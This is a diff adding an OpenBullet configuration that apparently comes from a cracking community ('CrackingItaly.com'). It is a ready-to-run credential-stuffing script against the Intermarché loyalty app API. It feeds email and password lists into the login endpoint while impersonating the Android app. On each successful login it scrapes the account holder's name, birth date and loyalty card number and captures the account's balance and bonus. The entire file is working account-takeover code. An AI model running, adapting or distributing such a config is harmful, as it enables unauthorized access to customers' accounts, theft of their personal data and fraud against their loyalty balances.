@@ -1,0 +1,82 @@
+[SETTINGS]
+{
+  "Name": "InterMarche",
+  "SuggestedBots": 9,
+  "LastModified": "2018-09-03T20:00:16.8556846+00:00",
+  "AdditionalInfo": "",
+  "Author": "demiurgo",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#PostApi REQUEST POST "https://api-vip-dmz.mousquetaires.com/ReferentielClient/v1/login" AutoRedirect=TRUE 
+  CONTENT "{\"email\":\"<USER>\",\"mdp\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Google-HTTP-Java-Client/1.11.0-beta (gzip)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "msq-app: moninter.android.smartphone" 
+  HEADER "msq-jeton-app: 06286033-5298-4063-904f-21db98ef03d0" 
+  HEADER "Content-Length: 53" 
+  HEADER "Host: api-vip-dmz.mousquetaires.com" 
+  HEADER "Connection: Keep-Alive" 
+#PARSE_jeton PARSE "<SOURCE>" LR "\"jeton\" : \"" "\"" Recursive=FALSE -> VAR "jeton" "" "" 
+#PARSE_ID PARSE "<SOURCE>" LR "\"id\" : \"" "\"" Recursive=FALSE -> VAR "ID" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "\"code\" : \"erreur.id.mdp.inconnu\"," 
+  KEYCHAIN Success OR 
+    KEY "\"jeton\" :" 
+  KEYCHAIN Failure OR 
+    KEY "\"message\" : \"L'identifiant ou le mot de passe est inconnu.\"" 
+  KEYCHAIN Success OR 
+    KEY "\"id\" : " 
+#REQUEST_GET REQUEST GET "https://api-vip-dmz.mousquetaires.com/ReferentielClient/v2.1/compte/<ID>?dm=true" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Google-HTTP-Java-Client/1.11.0-beta (gzip)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "msq-app: moninter.android.smartphone" 
+  HEADER "msq-jeton-util: <jeton>" 
+#PARSE_primogiorno PARSE "<SOURCE>" LR ",\"dateN\":\"" "\",\"deptN" Recursive=FALSE -> VAR "primogiorno" "[" "]" 
+#FUNCTION_Replace FUNCTION Replace "\/" "-" UseRegex=FALSE "<primogiorno>" -> VAR "replace" 
+#PARSE_giorno PARSE "<replace>" LR "" "" Recursive=FALSE -> VAR "giorno" "" "" 
+#PARSE_mese PARSE "<replace>" LR "" "" Recursive=FALSE -> VAR "mese" "" "" 
+#PARSE_anno PARSE "<replace>" LR "" "" Recursive=FALSE -> VAR "anno" "1" "" 
+#PARSE_Cognome PARSE "<SOURCE>" LR "nom\":\"" "\"" Recursive=FALSE -> VAR "cognome" "" "" 
+#PARSE_Nome PARSE "<SOURCE>" LR "prenom\":\"" "\"" Recursive=FALSE -> VAR "nome" "" "" 
+#PARSE_NumFID PARSE "<SOURCE>" LR "numfid\":\"" "\"" Recursive=FALSE -> VAR "numfid" "" "" 
+#FUNCTION_UNIX FUNCTION CurrentUnixTime "" -> VAR "UNIX" 
+#REQUEST_POST REQUEST POST "https://ws-ce-prd.mousquetaires.com/ldc-ws/rest/clients?idClient=<ID>&dateSync=<UNIX>" AutoRedirect=TRUE 
+  CONTENT "{\"id\":\"<ID>\",\"nom\":\"<cognome>\",\"prenom\":\"<nome>\",\"email\":\"<USER>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Google-HTTP-Java-Client/1.11.0-beta (gzip)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "msq-app: moninter.android.smartphone" 
+  HEADER "msq-jeton-util: <jeton>" 
+#REQUEST_POST2 REQUEST POST "https://api-vip-dmz.mousquetaires.com/ReferentielMetaService/card/v1/cardbonusinfo" AutoRedirect=TRUE 
+  CONTENT "{\"header\":{\"Channel\":\"WEB\",\"Lang\":\"FR\",\"loyaltyCode\":\"IF\",\"processType\":\"3\",\"requestDate\":\"20000101\",\"requestTime\":\"000001\"},\"identClient\":{\"cens\":\"IM\",\"cpays\":\"FR\",\"dateN\":\"<anno>-<mese>-<giorno>\",\"nom\":\"<cognome>\",\"numfid\":\"<numfid>\",\"prenom\":\"<nome>\",\"strict\":\"false\"}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Google-HTTP-Java-Client/1.11.0-beta (gzip)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "msq-app: moninter.android.smartphone" 
+  HEADER "msq-jeton-util: <jeton>" 
+#Capture_Saldo PARSE "<SOURCE>" LR "\",\"solde\":\"" "\"" Recursive=FALSE -> CAP "<CrackingItaly.com> demiurgo  |  Saldo" "" "" 
+#Capture_Bonus_in_corso PARSE "<SOURCE>" LR "bonusEnCours\":\"" "\"" Recursive=FALSE -> CAP "Bonus in corso" "" "" 
